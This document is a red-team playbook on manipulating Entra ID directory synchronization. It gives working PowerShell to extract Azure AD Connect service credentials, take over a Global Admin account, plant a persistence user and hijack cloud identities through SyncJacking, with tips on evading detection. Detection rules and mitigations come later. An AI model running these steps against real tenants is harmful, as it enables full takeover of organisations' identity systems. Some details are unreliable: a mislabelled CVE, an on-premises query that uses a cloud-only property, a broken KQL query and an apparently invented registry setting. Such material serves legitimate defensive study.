# PE-ACCTMGMT-015: Directory Synchronization Manipulation

**Full File Path:** `04_PrivEsc/PE-ACCTMGMT-015_DirSync.md`

---

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-015 |
| **MITRE ATT&CK v18.1** | [T1098.001 - Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Privilege Escalation (TA0004) |
| **Platforms** | Windows (on-premises AD), Cloud (Entra ID), Hybrid |
| **Severity** | Critical |
| **CVE** | CVE-2023-32315 (DirSync privilege escalation, patched August 2024) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure AD Connect versions; Microsoft Entra Cloud Sync; All Entra ID with hybrid sync; Windows Server 2012+ |
| **Patched In** | CVE-2023-32315 patched August 2024; SyncJacking under MSRC review (2025); Implicit permissions remain (no patch available) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Directory Synchronization Manipulation exploits the inherent trust relationship between on-premises Active Directory and cloud Entra ID by abusing Azure AD Connect (ADConnect) permissions, synchronization database access, and identity matching mechanisms. An attacker with compromised on-premises AD credentials or access to the ADConnect server can manipulate account attributes, reset passwords for cloud accounts, extract password hashes, or forcibly hijack cloud identities via techniques like SyncJacking (hard matching takeover) and soft matching abuse. The Directory Synchronization Accounts role retains implicit ADSynchronization.ReadWrite.All permissions even after Microsoft's August 2024 hardening, allowing password reset and attribute manipulation despite explicit permission reduction.

**Attack Surface:**
- **ADConnect Service Account** (MSOL_* account with DCSync permissions)
- **ADConnect Database** (ADSync.mdf with LocalDB)
- **ADConnect Server** (local admin access for credential extraction)
- **Directory Synchronization API** (implicit ADSynchronization.ReadWrite.All)
- **On-Premises Active Directory** (account attribute manipulation)
- **Entra ID Cloud Accounts** (as targets for takeover/manipulation)
- **DirSync Protocol** (on-premises to cloud synchronization channel)

**Business Impact:** **An attacker who compromises the ADConnect service account or on-premises AD with write permissions can reset passwords for ANY cloud account (including Global Admins), hijack cloud identities, extract password hashes, and establish persistent hybrid access.** The bi-directional trust enables lateral movement from on-premises to cloud and back, allowing complete tenant compromise while remaining difficult to detect (minimal audit trail).

**Technical Context:** ADConnect synchronization occurs automatically (default: 30-minute intervals) but can be forced on-demand by attackers with database access or through password hash manipulation. Detection depends on monitoring both on-premises AD changes AND cloud identity changes for misalignment. Reversibility is difficult; recovering a hijacked cloud identity requires removing it from synchronization scope and re-syncing a new on-premises source account, which requires significant ADConnect knowledge.

### Operational Risk

- **Execution Risk:** Medium. Requires either (a) on-premises AD write access, (b) ADConnect server local admin, or (c) compromised ADConnect service account. If any of these exist, exploitation is straightforward.
- **Stealth:** High. Attackers can minimize audit trail by using implicit API permissions (no direct logging) and timing attacks during normal sync cycles. SyncJacking leaves no on-prem logs.
- **Reversibility:** Very Difficult. SyncJacking hijacks cloud identities; recovery requires cloud admin intervention to break synchronization link and re-sync.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1, 5.1 | Hybrid users should NOT be assigned to privileged roles; ADConnect must be Tier 0. |
| **DISA STIG** | V-72983 | Restrict directory synchronization to non-privileged accounts only. |
| **CISA SCuBA** | MS.AAD.1.1 | Prevent on-premises accounts from being assigned cloud administrative roles. |
| **NIST 800-53** | AC-3, AC-5, AC-6, SI-3 | Access Enforcement, Separation of Duties, Least Privilege, Malware Protection. |
| **NIST 800-207** | Zero Trust | No implicit trust of synchronization channel; verify all identity changes. |
| **GDPR** | Art. 32 | Security of Processing; protect identity synchronization infrastructure. |
| **DORA** | Art. 9 | Protection and Prevention; secure hybrid identity infrastructure. |
| **NIS2** | Art. 21 | Cyber Risk Management; control identity synchronization accounts. |
| **ISO 27001** | A.9.1.1, A.13.1.3 | User Access Management; Segregation of Duties; Information security event logging. |
| **ISO 27005** | Risk Scenario: "Compromise of Identity Synchronization Infrastructure" | Hybrid attack enabling full tenant compromise. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (for exploitation):**
  - Compromised on-premises Domain Administrator or equivalent, OR
  - Local Administrator access on ADConnect server, OR
  - Compromised ADConnect service account (MSOL_*), OR
  - User with Directory Synchronization Accounts role in Entra ID

- **Required Access:**
  - Network access to on-premises AD (RPC/LDAP), OR
  - RDP access to ADConnect server, OR
  - Access to ADSync.mdf database file

**Supported Versions:**
- **Windows:** Server 2012 - 2025 (on-premises AD)
- **Azure AD Connect:** All versions (1.4.0+)
- **Microsoft Entra Cloud Sync:** All versions
- **Entra ID:** All versions with hybrid sync
- **PowerShell:** Version 5.0+

**Tools:**
- [adconnectdump / azuread_decrypt_msol](https://github.com/dirkjanm/adconnectdump) (ADConnect credential extraction)
- [AADInternals](https://github.com/Gerenios/AADInternals) (Implicit API exploitation)
- [Impacket](https://github.com/fortra/impacket) (DirSync protocol interaction)
- [ADSyncDecrypt](https://github.com/xpn/azuread_decrypt_msol) (Database decryption)
- Native: PowerShell, LDAP tools, SQL tools

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Management Station / PowerShell Reconnaissance

#### Check for Hybrid Synchronized Users and Privileges

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "User.Read.All", "Directory.Read.All"

# Find all hybrid-synced users (on-prem synchronization enabled)
$hybridUsers = Get-MgUser -All | Where-Object { $_.OnPremisesSyncEnabled -eq $true }

# Check which ones have privileged roles
$hybridUsers | ForEach-Object {
    $user = $_
    $roles = Get-MgUserMemberOf -UserId $user.Id | Where-Object { $_.ODataType -eq "#microsoft.graph.directoryRole" }
    if ($roles) {
        Write-Host "CRITICAL: Hybrid user with privileged role: $($user.UserPrincipalName)"
        $roles | ForEach-Object {
            $role = Get-MgDirectoryRole -DirectoryRoleId $_.Id
            Write-Host "  Role: $($role.DisplayName)"
        }
    }
}
```

**What to Look For:**
- Hybrid users (OnPremisesSyncEnabled = true) in privileged roles
- Global Admin, Privileged Role Admin assigned to hybrid accounts
- Users with source anchor (ImmutableId) indicating sync origin

#### Check for Directory Synchronization Accounts Role Members

```powershell
# Get Directory Synchronization Accounts role
$dirSyncRole = Get-MgDirectoryRole -Filter "displayName eq 'Directory Synchronization Accounts'"

# List all members
$syncMembers = Get-MgDirectoryRoleMember -DirectoryRoleId $dirSyncRole.Id

Write-Host "Directory Synchronization Accounts members:"
$syncMembers | ForEach-Object {
    $member = Get-MgServicePrincipal -Filter "id eq '$($_.Id)'" -ErrorAction SilentlyContinue
    if ($member) {
        Write-Host "  - $($member.DisplayName) (App ID: $($member.AppId))"
        Write-Host "    Treat as highly privileged - may have ADSynchronization.ReadWrite.All"
    }
}
```

**What to Look For:**
- Non-Microsoft service principals in Directory Synchronization Accounts role
- Multiple sync accounts (possible attacker additions)
- Service principals with suspicious names

#### Enumerate On-Premises AD Attributes for Sync

```powershell
# Connect to on-premises AD (requires ActiveDirectory module)
Get-ADUser -Filter { OnPremisesSyncEnabled -eq $true } -Properties * | `
  Where-Object { $_.AdminCount -eq 1 } | `
  Select-Object Name, UserPrincipalName, ObjectGUID | `
  ForEach-Object {
    Write-Host "Synchronized Admin: $($_.Name)"
    Write-Host "  Source Anchor: $([Convert]::ToBase64String($_.ObjectGUID.ToByteArray()))"
  }
```

**What to Look For:**
- Tier 0 accounts (domain admins, enterprise admins) that are synchronized
- Source anchor (ObjectGUID) for each account
- Accounts with unusual or recently changed attributes (mS-DS-ConsistencyGuid)

### 4.2 Linux/Bash / CLI Reconnaissance

```bash
# Check ADConnect configuration via PowerShell (Windows required)
# Or enumerate via LDAP
ldapsearch -H ldap://dc.company.local -x -s base -b "CN=Configuration,DC=company,DC=local" \
  "(cn=*ADConnect*)" | grep -E "cn|objectClass"

# Check for sync accounts in on-prem AD
ldapsearch -H ldap://dc.company.local -x -b "DC=company,DC=local" \
  "(&(samAccountName=MSOL_*)(AdminCount=1))" | grep -E "sAMAccountName|mail"
```

**What to Look For:**
- ADConnect-related objects in AD Configuration
- MSOL_* service accounts with high privileges

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: ADConnect Service Account Compromise & Password Reset Abuse

**Supported Versions:** All ADConnect versions; requires Domain Admin access or local admin on ADConnect server

#### Step 1: Compromise ADConnect Service Account Credentials

**Objective:** Extract the MSOL_* service account password from ADConnect database or registry.

**Command (on ADConnect server with local admin):**
```powershell
# Option A: Extract from Windows Credential Manager
$creds = Get-StoredCredential -Target "*MSOL*"
if ($creds) {
    Write-Host "Found MSOL credentials in Credential Manager"
    Write-Host "Password: $($creds.GetNetworkCredential().Password)"
}

# Option B: Extract from ADSync.mdf database (requires DBA/SYSTEM)
# Stop ADSync service first
Stop-Service ADSync -Force

# Use ADSyncDecrypt or adconnectdump tool
$adSyncPath = "C:\Program Files\Microsoft Azure AD Sync"
cd $adSyncPath

# Clone repository with decryption tool
# Run: python adconnectdump.py -db ADSync.mdf

# Option C: DPAPI decryption of encrypted credentials in registry
# Requires PSModule for DPAPI decryption
$regPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Sync"
$encryptedPassword = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty "EncryptedPassword" -ErrorAction SilentlyContinue

# Decrypt DPAPI blob (requires SYSTEM context or attacker's user context)
# Only possible if attacker is local admin or can run in SYSTEM context
```

**Expected Output:**
```
Found MSOL credentials in Credential Manager
Password: C0mpl3xP@ssw0rd!2024
```

**What This Means:**
- ADConnect service account credentials compromised
- Service account has DCSync equivalent permissions
- Can now interact with AD Sync engine and cloud sync APIs
- Can reset passwords for any AD user that syncs to cloud

**OpSec & Evasion:**
- Extract credentials offline if possible (don't access on compromised network initially)
- Avoid stopping ADSync service on production (alerts will be triggered)
- Use adconnectdump tool for minimal forensic artifacts
- Detection likelihood: Very High if service restart is monitored; Medium if tool usage is not detected

**Troubleshooting:**
- **Error:** "Access denied" to ADSync.mdf
  - **Cause:** File is locked by service or user lacks permissions
  - **Fix:** Stop ADSync service or run as SYSTEM
  
- **Error:** "Cannot decrypt DPAPI blob"
  - **Cause:** Attacker running in different user context than encryption
  - **Fix:** Ensure running as SYSTEM or original encryption user

**References & Proofs:**
- [dirkjanm/adconnectdump - Credential Extraction](https://github.com/dirkjanm/adconnectdump)
- [xpn/azuread_decrypt_msol - Alternative extraction](https://gist.github.com/xpn/0dc393e944d8733e3c63023c20e0b4ae)
- [Sygnia Research: ADConnect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)

#### Step 2: Use MSOL Account to Reset Hybrid User Password

**Objective:** Reset password of hybrid-synchronized cloud admin user via on-premises AD.

**Command:**
```powershell
# Authenticate as MSOL service account to on-prem AD
$molCred = New-Object System.Management.Automation.PSCredential `
  ("CONTOSO\MSOL_c1xxxxxxxxx", (ConvertTo-SecureString "C0mpl3xP@ssw0rd!2024" -AsPlainText -Force))

# Connect to on-premises AD
Set-ADAccountPassword -Identity "globaladmin" -NewPassword (ConvertTo-SecureString "NewP@ssw0rd123!" -AsPlainText -Force) `
  -Reset -Credential $molCred -Server "dc.company.local"

Write-Host "Password reset for on-prem user: globaladmin"
```

**Expected Output:**
```
Password reset for on-prem user: globaladmin
```

**What This Means:**
- On-premises user password changed (MSOL account has permissions)
- Change will automatically sync to Entra ID (if password hash sync enabled)
- Cloud admin account password is now under attacker's control
- Attacker can login to cloud with new password

**OpSec & Evasion:**
- Wait 5-30 minutes for sync cycle to complete (or use implicit API for immediate sync)
- Password reset to the MSOL account is logged in on-prem AD
- However, MSOL account having reset permissions is expected behavior
- Detection likelihood: Medium (password reset is expected); Low if timing is natural

**Troubleshooting:**
- **Error:** "User not found" or "Access denied"
  - **Cause:** MSOL account lacks permissions or user doesn't exist
  - **Fix:** Verify user exists and MSOL account has Reset-Password permission

**References & Proofs:**
- [Silverfort: Entra ID Account Synchronization Exploitation](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)

#### Step 3: Verify Cloud Account Compromise

**Objective:** Confirm password reset synced to cloud and test access.

**Command:**
```powershell
# Login to cloud with compromised admin account
$cloudCred = New-Object System.Management.Automation.PSCredential `
  ("globaladmin@company.onmicrosoft.com", (ConvertTo-SecureString "NewP@ssw0rd123!" -AsPlainText -Force))

Connect-MgGraph -Credential $cloudCred -Scopes "Directory.Read.All"

# Verify Global Admin status
$user = Get-MgMe
$roles = Get-MgUserMemberOf -UserId $user.Id
Write-Host "Successfully authenticated as: $($user.UserPrincipalName)"
Write-Host "Roles: $($roles.Count)"

# Perform admin action as proof
$newUser = New-MgUser -DisplayName "Persistence Account" `
  -MailNickname "persistence" `
  -UserPrincipalName "persistence@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "P3rsist3nceP@ss!" }

Write-Host "Proof of access: Created user: $($newUser.UserPrincipalName)"
```

**Expected Output:**
```
Successfully authenticated as: globaladmin@company.onmicrosoft.com
Roles: 5
Proof of access: Created user: persistence@company.onmicrosoft.com
```

**What This Means:**
- Cloud account fully compromised
- Attacker can perform any Global Admin action
- Full tenant compromise achieved

---

### METHOD 2: SyncJacking - Hard Matching Account Takeover

**Supported Versions:** All ADConnect versions; requires on-premises AD write access

#### Step 1: Identify Target Cloud Admin and Source Anchor

**Objective:** Find a privileged cloud-only or cloud admin account to hijack.

**Command (On-Premises AD):**
```powershell
# Get the target cloud admin's source anchor (ImmutableId)
# This is stored in on-prem AD as objectGUID converted to base64

$targetUser = Get-ADUser -Filter { Mail -eq "target-admin@company.onmicrosoft.com" } -Properties objectGUID -ErrorAction SilentlyContinue

if ($targetUser) {
    $sourceAnchor = [Convert]::ToBase64String($targetUser.objectGUID.ToByteArray())
    Write-Host "Target found: $($targetUser.Name)"
    Write-Host "Source Anchor: $sourceAnchor"
} else {
    Write-Host "User not found in on-prem AD - target is cloud-only"
    Write-Host "Will use SoftMatching if applicable"
}
```

**What to Look For:**
- Global Admin cloud account
- Verify account exists in cloud (on-prem sync not yet assigned)
- Obtain the cloud account's ImmutableId

#### Step 2: Create Attacker-Controlled Account and Copy Source Anchor

**Objective:** Create attacker's on-premises account with target's source anchor.

**Command:**
```powershell
# Create new on-prem account controlled by attacker
$newUser = New-ADUser -Name "AttackerAccount" `
  -SamAccountName "attackeraccount" `
  -AccountPassword (ConvertTo-SecureString "AttackerP@ss123!" -AsPlainText -Force) `
  -Enabled $true

$attUsr = Get-ADUser "attackeraccount" -Properties objectGUID

# Copy target's source anchor to attacker's account
# This forces hard matching to link attacker's account to target's cloud identity
Set-ADObject -Identity $attUsr -Replace @{
    "mS-DS-ConsistencyGuid" = $targetUser.objectGUID.ToByteArray()
}

Write-Host "Source anchor copied to attacker's account"
Write-Host "Attacker account GUID: $($attUsr.objectGUID)"
Write-Host "Target source anchor: $sourceAnchor"
```

**Expected Output:**
```
Source anchor copied to attacker's account
Attacker account GUID: a1b2c3d4-e5f6-7890-abcdef1234567890
Target source anchor: ...base64 encoded...
```

**What This Means:**
- Attacker's account now has the same source anchor as target's cloud account
- During next sync, hard matching will link attacker's on-prem account to target's cloud identity
- Cloud identity will now sync password and attributes from attacker's on-prem account

**OpSec & Evasion:**
- Perform these changes on off-hours if possible
- Attacker account creation is logged but may blend with normal AD activity
- Attribute modification (mS-DS-ConsistencyGuid) is logged in event ID 5136
- Detection likelihood: Medium if AD monitoring is enabled; Low if changes appear natural

#### Step 3: Delete Target's On-Premises Account and Trigger Sync

**Objective:** Force synchronization to link attacker's account to target's cloud identity.

**Command:**
```powershell
# Delete the original target account (if it existed on-prem)
if ($targetUser) {
    Remove-ADUser -Identity $targetUser.Name -Confirm:$false
    Write-Host "Original target account deleted: $($targetUser.Name)"
}

# Wait for AD replication (5-15 minutes)
# Or trigger manual sync cycle

# Option A: Wait for next scheduled sync (typically 30 minutes)
Write-Host "Waiting for next sync cycle..."
Start-Sleep -Seconds 1800

# Option B: Force sync immediately (if attacker has ADConnect access)
# Can use implicit API or direct database manipulation

# Verify hijack succeeded
Connect-MgGraph -Scopes "User.Read.All"
$hijackedUser = Get-MgUser -Filter "userPrincipalName eq 'target-admin@company.onmicrosoft.com'"

if ($hijackedUser) {
    $sourceAnchor = $hijackedUser.OnPremisesImmutableId
    if ($sourceAnchor -eq [Convert]::ToBase64String($attUsr.objectGUID.ToByteArray())) {
        Write-Host "HIJACK SUCCESSFUL!"
        Write-Host "Cloud account now synced from attacker's on-prem account"
    }
}
```

**Expected Output:**
```
Original target account deleted: globaladmin
Waiting for next sync cycle...
HIJACK SUCCESSFUL!
Cloud account now synced from attacker's on-prem account
```

**What This Means:**
- Target's cloud identity is now controlled by attacker's on-premises account
- Attacker can login to cloud using on-prem credentials
- Cloud account password syncs from on-prem (if PHS enabled)
- Display name and attributes sync from on-prem
- Complete identity takeover achieved

**OpSec & Evasion:**
- Account deletion is logged (event ID 4726) but expected for off-boarded users
- SyncJacking leaves no direct on-prem logs indicating takeover
- Cloud side shows expected sync activity
- No audit trail of the mS-DS-ConsistencyGuid modification
- Detection likelihood: Very Low (minimal traces); High only if comparing source anchors

---

### METHOD 3: Implicit ADSynchronization.ReadWrite.All API Abuse

**Supported Versions:** All ADConnect versions; even post-August 2024 hardening

#### Step 1: Authenticate as Directory Synchronization Service Account

**Objective:** Obtain access token for implicit ADSynchronization API.

**Command:**
```powershell
# Import AADInternals module
Import-Module AADInternals

# Authenticate using compromised MSOL or Sync service account
$creds = New-Object System.Management.Automation.PSCredential `
  ("CONTOSO\MSOL_c1xxxxxxxxx", (ConvertTo-SecureString "ServiceAccountPassword!" -AsPlainText -Force))

# Get access token with implicit permissions
$token = Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache

Write-Host "Access token obtained for implicit API"
```

**Expected Output:**
```
Access token obtained for implicit API
```

**What This Means:**
- Token includes implicit ADSynchronization.ReadWrite.All permission
- Permission not visible in explicit role assignments
- Can be used for password reset and attribute manipulation

#### Step 2: Use Implicit API to Reset Hybrid User Password

**Objective:** Reset password for hybrid user using undocumented sync API.

**Command:**
```powershell
# Get hybrid user's ImmutableId (source anchor)
$hybridUser = Get-ADUser -Filter { Mail -eq "admin@company.onmicrosoft.com" } -Properties objectGUID
$sourceAnchor = [Convert]::ToBase64String($hybridUser.objectGUID.ToByteArray())

# Use implicit API to reset password
# AADInternals provides a wrapper for this
Set-AADIntUserPassword -SourceAnchor $sourceAnchor `
  -Password "NewP@ssw0rd456!" `
  -AccessToken $token

Write-Host "Password reset via implicit API"
Write-Host "User: $($hybridUser.Name)"
```

**Expected Output:**
```
Password reset via implicit API
User: Administrator
```

**What This Means:**
- Password reset executed via undocumented API
- No explicit Directory.ReadWrite.All permission required
- Implicit ADSynchronization.ReadWrite.All permission sufficient
- Works even after Microsoft's explicit permission reductions

**OpSec & Evasion:**
- No direct audit trail (API call not logged)
- Operation appears as expected sync activity
- User can now login to cloud with new password
- Detection likelihood: Very Low (no direct logging)

**References & Proofs:**
- [ogwilliam.com: Hidden Permissions in Entra Synchronization](https://blog.ogwilliam.com/post/hybrid-identity-security-the-hidden-permissions-risk-in-entra-id-synchronization/)
- [Tenable Research: Implicit Permissions Persistence](https://www.tenable.com/blog/despite-recent-security-hardening-entra-id-synchronization-feature-remains-open-for-abuse)

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Integration

- **Atomic Test ID:** T1098.001-5 (Additional Cloud Credentials via DirSync)
- **Test Name:** "Manipulate Directory Synchronization to Reset Cloud Admin Password"
- **Description:** Simulate DirSync API abuse to reset hybrid admin account password.
- **Supported Versions:** All ADConnect versions

**Command:**
```powershell
Invoke-AtomicTest T1098.001 -TestNumbers 5
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1098.001 -TestNumbers 5 -Cleanup
```

**Reference:** [Atomic Red Team T1098.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.001/T1098.001.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### 7.1 adconnectdump

**Version:** Latest from GitHub
**Supported Platforms:** Windows, Linux (Python-based)

**Installation:**
```bash
git clone https://github.com/dirkjanm/adconnectdump.git
cd adconnectdump
pip install -r requirements.txt
```

**Usage - Extract ADConnect Credentials:**
```bash
python adconnectdump.py -db ADSync.mdf
# Output: Plain-text MSOL account credentials
```

### 7.2 AADInternals

**Version:** 0.9.7+
**Supported Platforms:** Windows (PowerShell 5.0+)

**Usage - Implicit API Password Reset:**
```powershell
Import-Module AADInternals
$token = Get-AADIntAccessTokenForAADGraph -Credentials $creds
Set-AADIntUserPassword -SourceAnchor $sourceAnchor -Password "NewPass!"
```

### 7.3 PowerShell One-Liners

**Reset Hybrid User Password via Implicit API:**
```powershell
Import-Module AADInternals; $t=Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential); Set-AADIntUserPassword -SourceAnchor "base64-encoded-guid" -Password "P@ss123!" -AccessToken $t
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: On-Premises AD Attribute Modification (SyncJacking Indicator)

**Rule Configuration:**
- **Required Index:** wineventlog
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventID, ObjectName, AttributeLDAPDisplayName
- **Alert Threshold:** Modification of mS-DS-ConsistencyGuid attribute
- **Applies To Versions:** All

**SPL Query:**
```spl
index=wineventlog sourcetype=WinEventLog:Security EventID=5136
| search AttributeLDAPDisplayName="mS-DS-ConsistencyGuid"
| stats count min(_time) as firstTime max(_time) as lastTime by SubjectUserName, ObjectName
| where count >= 1
| alert
```

**What This Detects:**
- Modification of mS-DS-ConsistencyGuid (source anchor)
- User performing the modification
- Object being modified
- Potential SyncJacking attempt

### Rule 2: ADConnect Service Account Suspicious Activity

**Rule Configuration:**
- **Required Index:** wineventlog
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** SubjectUserName, EventID, Activity
- **Alert Threshold:** MSOL account activity outside normal sync
- **Applies To Versions:** All

**SPL Query:**
```spl
index=wineventlog sourcetype=WinEventLog:Security SubjectUserName=*MSOL*
| search (EventID=4723 OR EventID=4724 OR EventID=4738)
| eval timestamp=strftime(_time, "%Y-%m-%d %H:%M:%S")
| stats count min(_time) as firstTime by SubjectUserName, TargetUserName, EventID
| alert
```

**What This Detects:**
- MSOL service account performing password resets
- Unusual times outside sync windows
- Multiple users affected

### Rule 3: Hybrid User Cloud-OnPrem Mismatch

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** TargetResources[0].userPrincipalName, properties.initiatedBy.user.userPrincipalName
- **Alert Threshold:** Sync activity for unexpected users
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Update user"
| search properties.dirSyncEnabled=true
| stats count by TargetResources{}.userPrincipalName
| where count > 5
| alert
```

**What This Detects:**
- Unusual sync activity patterns
- Multiple users synced in short timeframe
- Potential batch account takeover

---

## 9. MICROSOFT SENTINEL DETECTION RULES (KQL)

### Sentinel Rule 1: Source Anchor Modification (SyncJacking Attempt)

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "mS-DS-ConsistencyGuid"
| project TimeGenerated, SubjectUserName, ObjectName, EventID
| join kind=inner (
    AuditLogs
    | where OperationName == "Update user"
    | where TargetResources[0].onPremisesSyncEnabled == true
  ) on TimeGenerated
| project TimeGenerated, SubjectUserName, ObjectName, OperationName
```

### Sentinel Rule 2: MSOL Account Password Reset Activity

**Applies To Versions:** All Entra ID (with on-prem log ingestion)

**KQL Query:**
```kusto
SecurityEvent
| where SubjectUserName contains "MSOL"
| where EventID in (4723, 4724)
| extend TargetUser = TargetUserName
| project TimeGenerated, SubjectUserName, TargetUser, EventID
| where TargetUser !in ("krbtgt", "Guest")
| alert
```

### Sentinel Rule 3: Hybrid User Modified and Cloud Password Changed

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
let adChanges = SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName in ("unicodePwd", "userPassword", "mail")
| project TimeGenerated, ObjectName, SubjectUserName, ADChangeTime=TimeGenerated;
AuditLogs
| where OperationName in ("Reset password (by admin)", "Update user")
| where TargetResources[0].onPremisesSyncEnabled == true
| join kind=inner (adChanges) on ObjectName
| where ADChangeTime > (CloudChangeTime - 30m) and ADChangeTime < (CloudChangeTime + 30m)
| project TimeGenerated, ObjectName, SubjectUserName, OperationName
```

---

## 10. EVENT LOG & WINDOWS AUDIT DETECTION

### Event IDs Related to DirSync Manipulation

| Event ID | Source | Meaning | DirSync Attack Indicator |
|---|---|---|---|
| 5136 | Directory Services | Attribute Modified | mS-DS-ConsistencyGuid change = SyncJacking |
| 4723 | Security | User password changed | MSOL service account changing user password |
| 4724 | Security | Password reset by admin | Attacker using compromised admin account |
| 4726 | Security | User account deleted | Deletion of original target account (SyncJacking) |
| 4738 | Security | User account changed | Attacker modifying target account attributes |

**Audit Rule Configuration:**
```powershell
# Enable auditing for attribute modifications
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable

# Enable auditing for password operations
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable
```

---

## 11. SYSMON DETECTION (On-Premises)

### Sysmon Rule: Monitor ADConnect Service Restart (Potential Forensic Evasion)

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ServiceStateChange onmatch="include">
      <ServiceName condition="contains">ADSync</ServiceName>
      <State>Stopped</State>
    </ServiceStateChange>
    <ProcessCreate onmatch="include">
      <Image condition="contains">adconnectdump</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">sqlcmd</Image>
      <CommandLine condition="contains">ADSync</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**What This Detects:**
- ADSync service being stopped (possible forensic evasion)
- adconnectdump tool execution
- Direct database access attempts

---

## 12. MITIGATIONS & INCIDENT RESPONSE

### Immediate Mitigation (0-24 hours)

1. **Force Re-Sync of All Hybrid Users:**
   ```powershell
   # Restart ADConnect sync cycle to refresh all accounts
   Start-ADSyncSyncCycle -PolicyType Initial
   ```

2. **Rotate ADConnect Service Account Password:**
   ```powershell
   # Reset MSOL service account password in on-prem AD
   Set-ADAccountPassword -Identity "MSOL_*" -Reset -NewPassword (ConvertTo-SecureString "NewSecureP@ss" -AsPlainText -Force)
   
   # Update password in ADConnect configuration
   # (Requires ADConnect UI or PowerShell with specific module)
   ```

3. **Disable Hybrid Users from Privileged Roles:**
   ```powershell
   # Force cloud-only admins for all privileged roles
   Get-MgUser -All | Where-Object { $_.OnPremisesSyncEnabled -eq $true } | 
     ForEach-Object {
       $roles = Get-MgUserMemberOf -UserId $_.Id | Where-Object { $_.ODataType -eq "#microsoft.graph.directoryRole" }
       if ($roles) {
         # Remove from roles and document for re-assignment as cloud-only user
       }
     }
   ```

### Short-Term Mitigation (24-72 hours)

1. **Audit All Sync Configuration Changes:**
   - Export ADConnect sync rules
   - Export hybrid identity assignment history
   - Check for unauthorized rule modifications

2. **Review All Password Resets (Last 30 Days):**
   - Export on-prem AD password reset events
   - Export cloud password reset audit logs
   - Correlate for timing mismatches

3. **Verify Source Anchor Integrity:**
   ```powershell
   # Compare on-prem AD ObjectGUID with cloud ImmutableId
   # For each hybrid user, verify: base64(ObjectGUID) == ImmutableId
   ```

4. **Disable Hard Matching (if possible):**
   ```powershell
   # Disable Hard Matching takeover in ADConnect
   # Registry: HKLM\SOFTWARE\Microsoft\Azure AD Sync
   # Set: HardMatchingPolicy to "Disabled"
   ```

### Long-Term Mitigation (1+ months)

1. **Implement Zero Hybrid Architecture:**
   - Migrate all privileged identities to cloud-only
   - Never assign hybrid users to admin roles
   - Reserve on-prem synchronization for non-privileged users only

2. **Tier 0 Protection for ADConnect:**
   - Network isolation for ADConnect server
   - MFA for ADConnect server administrative access
   - Regular patching and hardening
   - Monitoring on service account credential access

3. **Exclude Tier 0 from Sync Scope:**
   - Remove domain admins from sync scope
   - Remove enterprise admins from sync scope
   - Exclude all privileged AD groups from cloud sync

4. **Implement Conditional Access:**
   - Require Passwordless Sign-in for hybrid admins
   - Block password reset for hybrid users from cloud
   - Force re-authentication for privileged operations

### Incident Response Playbook

1. **Detection & Initial Response:**
   - Alert triggers on source anchor modification or suspicious password reset
   - Incident lead verifies alert (exclude false positives from scheduled syncs)
   - Preserve logs from both on-prem AD and Entra ID

2. **Containment:**
   - Disable ADConnect synchronization
   - Force password reset for all hybrid admin accounts
   - Revoke all active sessions and tokens for affected accounts
   - Remove any newly created accounts or role assignments

3. **Eradication:**
   - Restore ADConnect service account to pre-compromise state
   - Audit ADConnect database for unauthorized modifications
   - Reset source anchors for any hijacked cloud identities
   - Re-sync affected accounts with clean on-prem source

4. **Recovery:**
   - Restore on-prem AD from backup if compromise suspected
   - Re-enable synchronization with verified safe configuration
   - Verify all hybrid users' cloud attributes match on-prem source
   - Implement additional monitoring

5. **Post-Incident:**
   - Forensic analysis of on-prem AD logs (60-day lookback)
   - Forensic analysis of ADConnect logs and database
   - Check for lateral movement to other on-prem systems
   - Implement long-term mitigations (Tier 0 protection, cloud-only admins)

---

## 13. REFERENCES & FURTHER READING

**Official Microsoft Documentation:**
- [Microsoft Entra Connect Version History](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-version-history)
- [Secure Microsoft Entra Connect](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-password-hash-synchronization)
- [Protect Hybrid Identity from On-Premises Attacks](https://learn.microsoft.com/en-us/entra/architecture/protect-m365-from-on-premises-attacks)

**Security Research & CVEs:**
